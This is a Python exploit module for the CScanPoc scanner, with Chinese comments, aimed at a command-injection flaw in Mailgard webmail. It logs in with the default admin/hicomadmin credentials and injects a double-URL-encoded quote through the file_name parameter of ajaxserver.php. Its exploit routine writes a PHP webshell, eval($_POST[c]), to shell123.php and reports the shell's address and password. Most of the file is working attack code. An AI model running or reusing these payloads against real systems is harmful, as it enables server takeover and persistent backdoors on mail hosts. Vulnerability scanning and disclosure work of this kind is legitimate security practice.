# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import sys


class Vuln(ABVuln):
    vuln_id = 'Mailgard_0011'  # 平台漏洞编号，留空
    name = '佑友mailgard webmail命令执行之二'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2015-03-30'  # 漏洞公布时间
    desc = '''
        百度搜索intitle:"mailgard webmail"，多家没有改admin密码的中招，默认密码admin/hicomadmin
        /var/www/newmail/src/ajaxserver.php

        问题在于：
        $file_name = urldecode($_POST['file_name']);
        exec("cd '".$dir."'; cp '".$file_name."' '".$movefile."'",$rs,$res);
        虽然exec函数里$file_name有单引号包含，但是$file_name = urldecode($_POST['file_name']);，可以2次urlencode单引号绕过addslashes
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/3042/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Mailgard'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


def login(target, username, password):
    login_request = ''
    global sessionid
    domain = target.split(".")[1]
    login_url = target + 'index.php'
    post_data = 'txtname=' + username + '&domain=' + domain + '&txtpwd=' + \
        password + '&languages=zh-cn&button=%E7%99%BB+%E5%BD%95'
    try:
        login_request = requests.post(
            login_url, post_data, allow_redirects=False, verify=False, timeout=3)
        if login_request.status_code == 302:
            # print 'login succeeded'
            sessionid = login_request.cookies['PHPSESSID']
            return sessionid
        else:
            # print 'login failed,please check username and password'
            return False
    except Exception as e:
        # print Exception,":",e
        return False


class Poc(ABPoc):
    poc_id = '96f14640-9451-4eb6-89d3-fdeecab7a8b8'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-21'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def myverify(self, target, sessionid):
        getshell_request = ''
        url = target + 'src/ajaxserver.php?exec=saveToNet&sd=aa:admin'
        getshell_header = {'cookie': 'MAILSESSID=' +
                           str(sessionid) + '; PHPSESSID=' + str(sessionid)}
        getshell_data = 'net_dir=a&file_name=%2527|echo %2527<?php echo md5(c);?>%2527>/var/www/newmail/shell123.php%2527'
        # print getshell_data
        try:
            getshell_request = requests.post(
                url, getshell_data, headers=getshell_header, allow_redirects=False, verify=False)
            r = requests.get(target + '/shell123.php', verify=False)

            if r.status_code == 200 and '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            # print Exception,":",e
            return False

    def getshell(self, target, sessionid):
        getshell_request = ''
        url = target + 'src/ajaxserver.php?exec=saveToNet&sd=aa:admin'
        getshell_header = {'cookie': 'MAILSESSID=' +
                           str(sessionid) + '; PHPSESSID=' + str(sessionid)}
        getshell_data = 'net_dir=a&file_name=%2527|echo %2527<?php echo md5(c);eval($_POST[c]);?>%2527>/var/www/newmail/shell123.php%2527'
        # print getshell_data
        try:
            getshell_request = requests.post(
                url, getshell_data, headers=getshell_header, allow_redirects=False, verify=False)
            verify_url = target + '/shell123.php'
            r = requests.get(url, verify=False)

            if r.status_code == 200 and '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，已上传webshell地址:{url}密码为c,请及时删除。'.format(
                    target=self.target, name=self.vuln.name, url=verify_url))
                # print 'getshell failed!'

        except Exception as e:
            # print Exception,":",e
            return False

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            target = self.target
            username = 'admin'
            password = 'hicomadmin'
            if (login(target, username, password)):
                # print 'sessionid=' + sessionid
                # verify
                self.myverify(target, sessionid)

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            target = self.target
            username = 'admin'
            password = 'hicomadmin'
            if (login(target, username, password)):
                # print 'sessionid=' + sessionid
                # verify
                self.getshell(target, sessionid)

        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
